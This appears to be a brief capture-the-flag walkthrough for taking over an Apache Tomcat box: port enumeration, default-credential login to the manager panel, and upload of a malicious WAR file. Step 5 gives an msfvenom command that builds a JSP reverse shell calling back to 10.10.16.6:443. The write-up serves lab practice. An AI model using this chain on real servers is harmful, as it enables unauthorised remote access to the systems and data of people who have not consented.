1. Enumerate open ports in the machine. 8080

2. As we're in front of an Apache Tomcat we can look for vulnerabilities that appear because of the old apache version

3. Apache Tomcat has a certain directory called __{IP}__/manager/html that enables you to have full access to the site. Must-try in this type of websites

4. The username and password were set as default so the only thing to do is just enter into the control panel

5. Upload a malicious .war to the upload section in order to get remote command execution in the application
		5.1 - This step can be done by running the following command just to get the possible java payloads: msfvenom -l | grep java 
        5.2 - And after seeing the previous command output go on and try this "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o shell.war"
	        -p : To specify the payload to use
	        -f : To specify the file extension
	        -o : To specify the file name

6. Type the file from the Admin user in the machine
